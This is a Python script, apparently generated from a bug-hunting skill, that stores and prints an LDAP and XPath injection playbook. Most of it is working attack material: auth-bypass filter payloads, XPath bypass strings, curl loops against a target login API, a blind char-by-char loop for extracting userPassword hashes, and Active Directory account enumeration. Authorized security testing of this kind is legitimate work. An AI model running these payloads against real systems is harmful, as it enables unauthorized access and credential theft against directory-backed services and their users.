#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-ldap

Skill: HUNT-LDAP — LDAP Injection & XPath Injection
Desc : Hunt LDAP Injection and XPath Injection — authentication bypass, blind char-by-char attribute exfiltration, AD user/group enumeration, XML-store XPath bypass. Covers the LDAP special-character set (* ( ) \\ NUL /), search-filter-context vs DN-injection, parenthesis-balancing, AND/OR filter logic, and {SSHA}/{CRYPT} userPassword exfil on non-AD directories. Use when target uses LDAP/AD authentication, corporate SSO with a directory backend, an address-book/people-search API, or XML-based data stores queried with XPath.

Run:  python claude-bughunter-hunt-ldap.py --help
      python claude-bughunter-hunt-ldap.py --list
      python claude-bughunter-hunt-ldap.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-ldap'
TITLE = 'HUNT-LDAP — LDAP Injection & XPath Injection'
DESCRIPTION = 'Hunt LDAP Injection and XPath Injection — authentication bypass, blind char-by-char attribute exfiltration, AD user/group enumeration, XML-store XPath bypass. Covers the LDAP special-character set (* ( ) \\\\ NUL /), search-filter-context vs DN-injection, parenthesis-balancing, AND/OR filter logic, and {SSHA}/{CRYPT} userPassword exfil on non-AD directories. Use when target uses LDAP/AD authentication, corporate SSO with a directory backend, an address-book/people-search API, or XML-based data stores queried with XPath.'

PAYLOADS = {
    'main': ["name: hunt-ldap", "description: \"Hunt LDAP Injection and XPath Injection \u2014 authentication bypass, blind char-by-char attribute exfiltration, AD user/group enumeration, XML-store XPath bypass. Covers the LDAP special-character set (* ( ) \\\\ NUL /), search-filter-context vs DN-injection, parenthesis-balancing, AND/OR filter logic, and {SSHA}/{CRYPT} userPassword exfil on non-AD directories. Use when target uses LDAP/AD authentication, corporate SSO with a directory backend, an address-book/people-search API, or XML-based data stores queried with XPath.\"", "sources: hackerone_public, owasp, portswigger", "report_count: 0"],
    'hunt-ldap-ldap-injection-xpath-injection': [],
    'crown-jewel-targets': ["LDAP injection that bypasses authentication = **Critical**. Blind attribute", "exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.", "**Highest-value chains:**", "- **LDAP auth bypass** \u2014 close the `uid` filter and append an always-true OR so the", "bind/search returns the admin entry without a valid password.", "- **Blind attribute exfil** \u2014 char-by-char extraction of an attribute value via a", "boolean oracle (login success/failure, result count, or response length).", "- **userPassword hash exfil (non-AD only)** \u2014 on OpenLDAP/389-DS the", "`userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable", "by query. See the AD-vs-generic warning below.", "- **XPath injection auth bypass** \u2014 `' or '1'='1` against XML-backed auth."],
    'critical-active-directory-vs-generic-ldap': ["Do **not** conflate the two. They behave very differently:", "**Do not tell a reader that blind LDAP injection yields AD password hashes \u2014 it", "does not.** `unicodePwd` is write-only. Against AD, the win is enumeration", "(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to", "store passwords) and auth bypass \u2014 not hash dumping. The hash-exfil technique", "applies **only** to non-AD directories exposing `userPassword`."],
    'attack-surface-signals': ["Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)", "Windows + IIS + \"integrated\" directory auth", "/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=", "\"Find a colleague\" / org-chart / employee-search features", "XML-backed config or auth \u2192 XPath injection candidate", "Error strings that confirm an LDAP backend:", "javax.naming.NameNotFoundException", "javax.naming.directory.InvalidSearchFilterException", "LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)", "com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():", "\"Bad search filter\"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN"],
    'ldap-filter-grammar-rfc-4515-why-injection-works': ["A login filter is typically built by string-concat:", "(&(uid=<USERNAME>)(userPassword=<PASSWORD>))", "`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** \u2014 the", "operator comes first and every sub-filter is parenthesised. To inject you must", "(a) escape the current `(uid=...)` group, (b) inject your own logic, and", "(c) leave the overall parenthesis count **balanced** or the server throws a", "filter-syntax error instead of executing."],
    'the-special-character-set-test-each-one': ["These characters are syntactically meaningful and MUST be escaped by a safe app", "(RFC 4515 \u00a73). If the app reflects an error or behaves differently when you send", "them raw, the input is unescaped \u2192 injectable:", "**Search-filter context vs DN injection** are different bugs:", "- **Search-filter injection** (most common): your input lands inside a", "`(attr=VALUE)` filter. Payloads use `* ( ) & | !`.", "- **DN injection**: your input is concatenated into a Distinguished Name", "(`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `\"` `\\` `<` `>` `;` and `/`", "matter, and a `*` is NOT a wildcard. Test both \u2014 the payloads do not transfer."],
    'step-by-step-hunting-methodology': [],
    'phase-1-confirm-an-ldap-backend-baseline-first': ["```bash"],
    'always-capture-a-control-response-first-you-compare-everything-to-this': ["BASE=$(curl -s -o /dev/null -w \"%{http_code}|%{size_download}|%{time_total}\" \\", "-X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\":\"validlookinguser\",\"password\":\"wrongpass\"}')", "echo \"BASELINE (valid-format, wrong pw): $BASE\""],
    'send-a-single-unbalanced-paren-a-safe-escaping-app-identical-baseline': [],
    'an-injectable-app-500-filter-syntax-error-different-size': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d '{\"username\":\"test)\",\"password\":\"x\"}' | grep -iE \\", "\"naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search\"", "A lone `)` that produces a syntax error/500 while a balanced payload does not is", "the cleanest LDAP-injection tell \u2014 note it, you will need it as proof."],
    'phase-2-auth-bypass-payloads-balance-your-parentheses': ["```bash"],
    'target-filter-assumed-uid-username-userpassword-password': [],
    'goal-make-the-uid-sub-filter-always-true-and-neutralise-the-password-clause': [],
    'wildcard-everything-works-when-password-clause-is-dropped-by-a-trailing-comment-like-break': [],
    'username-uid-uid-password-anything': [],
    'always-true-admin-or-uid': [],
    'username-admin-uid-note-leaves-one-extra-see-below': [],
    'nul-truncate-the-password-clause-c-backed-servers': [],
    'username-admin-uid-00-password-x': ["USERNAME_PAYLOADS=(", "'admin))(|(uid=*'        # close uid + close &, open OR uid=* \u2014 balance check below", "'*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic", "'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set \u2192 always true", "'admin*'                 # simple wildcard suffix \u2014 try first, lowest noise", "for P in \"${USERNAME_PAYLOADS[@]}\"; do", "R=$(curl -s -w \"|%{http_code}|%{size_download}\" -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"username\\\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' \"$P\"),\\\"password\\\":\\\"anything\\\"}\")", "echo \"PAYLOAD: $P\"", "echo \"RESP:    ${R: -40}\"", "echo \"BASE:    $BASE   <-- compare http_code+size to rule out false positive\"", "echo \"---\"", "**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*", "full filter, not just your payload. If the app appends `)(userPassword=...))`", "after your input, leave the right number of trailing `)` so the final string is", "balanced. An unbalanced filter = syntax error = NOT a bypass (false positive)."],
    'phase-3-blind-exfil-with-a-controlled-oracle-not-raw-byte-count': ["Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,", "length-jitter on the injected char itself). Use a **paired true/false control**", "so the oracle is the *response*, not the absolute size.", "```bash"],
    'oracle-pair-a-known-true-filter-and-a-known-false-filter-on-a-public-attr': [],
    'true-admin-uid-uid-entry-exists': [],
    'false-admin-uid-nonexist-zzz-uid-nonexist-zzz': ["probe () {  # $1 = filter-tail payload -> prints normalized size", "curl -s -o /dev/null -w \"%{size_download}\" -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"username\\\":\\\"$1\\\",\\\"password\\\":\\\"x\\\"}\"", "T=$(probe 'admin)(uid=*))(|(uid=*')", "F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')", "echo \"TRUE-class size=$T  FALSE-class size=$F\"", "[ \"$T\" = \"$F\" ] && { echo \"No length oracle \u2014 try a STATUS or BODY-MARKER oracle, or OOB.\"; exit; }"],
    'now-extract-char-by-char-the-boolean-test-compares-against-t-f-not-a-guess': [],
    'filter-uid-admin-userpassword-prefix-char-on-a-non-ad-directory': ["PREFIX=\"\"", "for pos in $(seq 1 32); do", "for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do", "S=$(probe \"admin)(userPassword=${PREFIX}${C}*))(|(uid=*\")", "if [ \"$S\" = \"$T\" ]; then PREFIX=\"${PREFIX}${C}\"; echo \"[$pos] -> $PREFIX\"; break; fi", "echo \"RECOVERED: $PREFIX\"", "False-positive guards for blind exfil:", "- **Repeat each positive char 3x** and confirm the size is stable \u2014 length-jitter", "from the attacker-controlled char itself is the #1 false positive.", "- Confirm the **FALSE control still returns the FALSE size** after each round (the", "app didn't just start erroring on every request \u2014 WAF block looks like a match).", "- If body length is unreliable, switch the oracle to **HTTP status**, a **body", "marker string** (`\"Invalid credentials\"` present/absent), or **timing** with a", "heavy filter \u2014 but only after establishing a stable baseline delta."],
    'phase-4-xpath-injection-xml-backed-auth': ["```bash"],
    'normal-users-user-name-text-admin-and-password-text-pass': [],
    'bypass-closes-the-name-predicate-and-or-trues-the-whole-expression': ["XPATH_PAYLOADS=(", "\"' or '1'='1\"", "\"' or ''='\"", "\"admin' or '1'='1' or 'a'='b\"     # keeps quoting balanced", "\"x'] | //user/* | //user[name()='x\"  # blind: dump all user nodes (XPath has no comments)", "\"*[contains(name(),'pass')]\"          # node-name discovery", "for P in \"${XPATH_PAYLOADS[@]}\"; do", "E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"$P\")", "R=$(curl -s -w \"|%{http_code}|%{size_download}\" -X POST https://$TARGET/api/login \\", "--data-urlencode \"username=$P\" --data-urlencode \"password=x\")", "echo \"$P  ->  ${R: -24}\""],
    'xpath-has-no-comment-syntax-you-must-keep-quotes-brackets-balanced-unlike-sqli': [],
    'phase-5-ad-enumeration-via-wildcard-count-oracle-with-control': ["```bash"],
    'establish-that-prefix-zzqx-unlikely-returns-0-and-prefix-a-returns-more': [],
    'a-directory-that-returns-the-same-count-for-both-is-not-leaking-via-wildcard': ["count () { curl -s -X POST https://$TARGET/api/directory/search \\", "-H \"Content-Type: application/json\" -d \"{\\\"filter\\\":\\\"(sAMAccountName=$1*)\\\"}\" \\", "CTRL=$(count \"zzqx_unlikely\")", "echo \"control count (should be ~0): $CTRL\"", "for L in {a..z}; do echo \"$L* -> $(count $L)  (vs control $CTRL)\"; done"],
    'then-pivot-to-memberof-description-for-privileged-accounts': [],
    'samaccountname-memberof-domain-admins': [],
    'description-pw-description-pass-admins-stash-secrets-here': [],
    'phase-6-tooling-oob-confirmation': ["```bash"],
    'validate-the-inferred-filter-directly-if-you-ever-get-ldap-creds-a-bind': ["ldapsearch -x -H ldap://$AD_HOST -D \"CORP\\\\user\" -w \"$PW\" \\", "-b \"dc=corp,dc=local\" \"(&(objectClass=user)(sAMAccountName=admin*))\" sAMAccountName memberOf"],
    'burp-intruder-over-the-char-set-for-blind-exfil-the-web-security-academy': [],
    'blind-ldap-injection-labs-mirror-the-phase-3-oracle-exactly': [],
    'oob-rare-but-decisive-some-jndi-ldap-stacks-resolve-a-referral-if-you-can': [],
    'inject-a-referral-url-the-server-dereferences-point-it-at-collaborator': [],
    'uid-referral-ldap-collab-x-a-dns-ldap-hit-at-collaborator': [],
    'is-server-side-proof-with-zero-ambiguity-treat-any-collaborator-interaction': [],
    'as-the-gold-standard-confirmation-for-otherwise-blind-cases': [],
    'chain-table': [],
    'validation-rule-out-the-false-positive-before-you-report': ["A \"bypass\" or \"match\" is only real once you have eliminated syntax-error,", "WAF-block, and length-jitter explanations.", "- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated", "session** (session cookie + access to a post-login resource), and the same", "request with one paren removed returns a **filter-syntax error** \u2014 proving", "the filter parsed and executed, not that the app fell open on every input.", "- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload", "(`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both", "true-class and false-class \"succeed\", you found a broken endpoint, not LDAP", "injection.", "- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the", "FALSE control still reads FALSE between rounds; recovered value verified by", "a direct lookup or by the auth-bypass payload that uses it.", "- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged", "in to a real account context \u2014 not just a different error page.", "- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral", "payload is decisive for blind cases \u2014 prefer it over length-only inference.", "- [ ] **AD claim discipline:** if you say \"AD\", you enumerated AD-specific attrs", "(`sAMAccountName`/`memberOf`); never claim AD hash exfil.", "**Severity:**", "- Auth bypass landing as admin/privileged directory entry: **Critical**", "- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**", "- AD user/group enumeration only: **Medium-High**", "- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()